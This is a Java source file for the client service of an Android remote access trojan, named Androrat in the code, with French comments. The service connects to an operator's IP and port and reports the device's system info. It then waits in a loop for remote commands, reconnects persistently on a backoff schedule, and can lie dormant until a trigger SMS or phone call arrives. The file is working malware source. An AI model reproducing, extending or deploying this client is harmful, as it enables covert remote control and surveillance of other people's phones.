package my.app.client;

import inout.Controler;
import inout.Protocol;

import java.util.Calendar;

import my.app.Library.SystemInfo;
import out.Connection;
import Packet.CommandPacket;
import Packet.LogPacket;
import Packet.PreferencePacket;
import Packet.TransportPacket;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

public class Client extends ClientListener implements Controler {

	public final String TAG = Client.class.getSimpleName();
	Connection conn;

	int nbAttempts = 10; // sera décrementé a 5 pour 5 minute 3 pour 10 minute
							// ..
	int elapsedTime = 1; // 1 minute

	boolean stop = false; // Pour que les threads puissent s'arreter en cas de
							// déconnexion

	boolean isRunning = false; // Le service tourne
	boolean isListening = false; // Le service est connecté au serveur
	// final boolean waitTrigger = false; //On attend un évenement pour essayer
	// de se connecter.
	Thread readthread;
	ProcessCommand procCmd;
	byte[] cmd;
	CommandPacket packet;

	private final Handler handler = new Handler() {

		public void handleMessage(Message msg) {
			final Bundle b = msg.getData();
			Client.this.processCommand(b);
		}
	};

	@Override
	public void handleData(int channel, byte[] data) {
		this.conn.sendData(channel, data);
	}

	@Override
	public void loadPreferences() {
		final PreferencePacket p = this.procCmd.loadPreferences();
		this.waitTrigger = p.isWaitTrigger();
		this.ip = p.getIp();
		this.port = p.getPort();
		this.authorizedNumbersCall = p.getPhoneNumberCall();
		this.authorizedNumbersSMS = p.getPhoneNumberSMS();
		this.authorizedNumbersKeywords = p.getKeywordSMS();
	}

	public void onCreate() {
		Log.i(this.TAG, "In onCreate");
		this.infos = new SystemInfo(this);
		this.procCmd = new ProcessCommand(this);

		this.loadPreferences();
	}

	public void onDestroy() {
		// savePreferences("myPref");
		// savePreferences("preferences");

		Log.i(this.TAG, "in onDestroy");
		unregisterReceiver(this.ConnectivityCheckReceiver);
		this.conn.stop();
		this.stop = true;
		stopSelf();
		super.onDestroy();
	}

	public int onStartCommand(Intent intent, int flags, int startId) {
		// toast = Toast.makeText(this ,"Prepare to laod", Toast.LENGTH_LONG);
		// loadPreferences("preferences");
		// Intent i = new Intent(this,Preferences.class);
		// startActivity(i);
		if (intent == null)
			return START_STICKY;
		final String who = intent.getAction();
		Log.i(this.TAG, "onStartCommand by: " + who); // On affiche qui a
														// déclenché
														// l'event

		if (intent.hasExtra("IP"))
			this.ip = intent.getExtras().getString("IP");
		if (intent.hasExtra("PORT"))
			this.port = intent.getExtras().getInt("PORT");

		if (!this.isRunning) {// C'est la première fois qu'on le lance

			// --- On ne passera qu'une fois ici ---
			final IntentFilter filterc = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"); // Va
																									// monitorer
																									// la
																									// connexion
			registerReceiver(this.ConnectivityCheckReceiver, filterc);
			this.isRunning = true;
			this.conn = new Connection(this.ip, this.port, this);// On se
																	// connecte
																	// et on
																	// lance
			// les threads

			if (this.waitTrigger)
				// serveur
				// On ne fait rien
				this.registerSMSAndCall();
			else {
				Log.i(this.TAG, "Try to connect to " + this.ip + ":" + this.port);
				if (this.conn.connect()) {
					this.packet = new CommandPacket();
					this.readthread = new Thread(new Runnable() {
						public void run() {
							Client.this.waitInstruction();
						}
					});
					this.readthread.start(); // On commence vraiment a écouter
					final CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0,
						this.infos.getBasicInfos());
					this.handleData(0, pack.build());
					// gps = new GPSListener(this,
					// LocationManager.NETWORK_PROVIDER,(short)4);
					// //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
					this.isListening = true;
					if (this.waitTrigger) {
						unregisterReceiver(this.SMSreceiver); // On
																// désenregistre
																// SMS
																// et Call pour
																// éviter tout
																// appel
																// inutile
						unregisterReceiver(this.Callreceiver);
						this.waitTrigger = false;
					}
				} else if (this.isConnected) { // On programme le AlarmListener
												// car y a
					// un probleme coté serveur
					this.resetConnectionAttempts();
					this.reconnectionAttempts();
				} else
					// se débloquer
					Log.w(this.TAG, "Not Connected wait a Network update");
			}
		} else if (this.isListening)
			Log.w(this.TAG, "Called uselessly by: " + who + " (already listening)");
		else { // Sa veut dire qu'on a reçu un broadcast sms ou call
				// On est ici soit par AlarmListener,
				// ConnectivityManager, SMS/Call ou X
				// Dans tout les cas le but ici est de se connecter
			Log.i(this.TAG, "Connection by : " + who);
			if (this.conn.connect()) {
				this.readthread = new Thread(new Runnable() {
					public void run() {
						Client.this.waitInstruction();
					}
				});
				this.readthread.start(); // On commence vraiment a écouter
				final CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0,
					this.infos.getBasicInfos());
				this.handleData(0, pack.build());
				this.isListening = true;
				if (this.waitTrigger) {
					unregisterReceiver(this.SMSreceiver);
					unregisterReceiver(this.Callreceiver);
					this.waitTrigger = false; // In case of disconnect does not
												// wait again for a trigger
				}
			} else
				this.reconnectionAttempts(); // Va relancer l'alarmListener
		}

		return START_STICKY;
	}

	public void processCommand(Bundle b) {
		try {
			this.procCmd.process(b.getShort("command"), b.getByteArray("arguments"),
				b.getInt("chan"));
		} catch (final Exception e) {
			this.sendError("Error on Client:" + e.getMessage());
		}
	}

	public void reconnectionAttempts() {
		/*
		 * 10 fois toute les minutes 5 fois toutes les 5 minutes 3 fois toute
		 * les 10 minutes 1 fois au bout de 30 minutes
		 */
		if (!this.isConnected)
			return;

		if (this.nbAttempts == 0)
			switch (this.elapsedTime) {
			case 1:
				this.elapsedTime = 5;
				break;
			case 5:
				this.elapsedTime = 10;
				break;
			case 10:
				this.elapsedTime = 30;
				break;
			case 30:
				return; // Did too much try
			}
		// ---- Piece of Code ----
		final Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, this.elapsedTime);

		final Intent intent = new Intent(this, AlarmListener.class);

		intent.putExtra("alarm_message", "Wake up Dude !");

		final PendingIntent sender = PendingIntent.getBroadcast(this, 0, intent,
			PendingIntent.FLAG_UPDATE_CURRENT);
		// Get the AlarmManager service
		final AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);

		// -----------------------
		this.nbAttempts--;
	}

	public void registerSMSAndCall() {
		final IntentFilter filter = new IntentFilter();
		filter.addAction("android.provider.Telephony.SMS_RECEIVED"); // On
																		// enregistre
																		// un
																		// broadcast
																		// receiver
																		// sur
																		// la
																		// reception
																		// de
																		// SMS
		registerReceiver(this.SMSreceiver, filter);
		final IntentFilter filter2 = new IntentFilter();
		filter2.addAction("android.intent.action.PHONE_STATE");// TelephonyManager.ACTION_PHONE_STATE_CHANGED);
																// //On
																// enregistre un
																// broadcast
																// receiver sur
																// la reception
																// de SMS
		registerReceiver(this.Callreceiver, filter2);
	}

	public void resetConnectionAttempts() {
		this.nbAttempts = 10;
		this.elapsedTime = 1;
	}

	@Override
	public void sendError(String error) { // Methode que le Client doit
											// implémenter pour envoyer des
											// informations
		this.conn.sendData(1, new LogPacket(System.currentTimeMillis(), (byte) 1, error).build());
	}

	@Override
	public void sendInformation(String infos) { // Methode que le Client doit
												// implémenter pour envoyer des
												// informations
		this.conn.sendData(1, new LogPacket(System.currentTimeMillis(), (byte) 0, infos).build());
	}

	public void Storage(TransportPacket p, String i) {
		try {
			this.packet = new CommandPacket(); // !!!!!!!!!!!! Sinon on peut
												// surement
												// en valeur les arguments des
												// command précédantes !
			this.packet.parse(p.getData());

			final Message mess = new Message();
			final Bundle b = new Bundle();
			b.putShort("command", this.packet.getCommand());
			b.putByteArray("arguments", this.packet.getArguments());
			b.putInt("chan", this.packet.getTargetChannel());
			mess.setData(b);
			this.handler.sendMessage(mess);
		} catch (final Exception e) {
			System.out.println("Androrat.Client.storage : pas une commande");
		}
	}

	public void waitInstruction() { // Le thread sera bloqué dedans
		try {
			for (;;) {
				if (this.stop)
					break;
				this.conn.getInstruction();
			}
		} catch (final Exception e) {
			this.isListening = false;
			this.resetConnectionAttempts();
			this.reconnectionAttempts();
			if (this.waitTrigger)
				this.registerSMSAndCall();
		}
	}
}
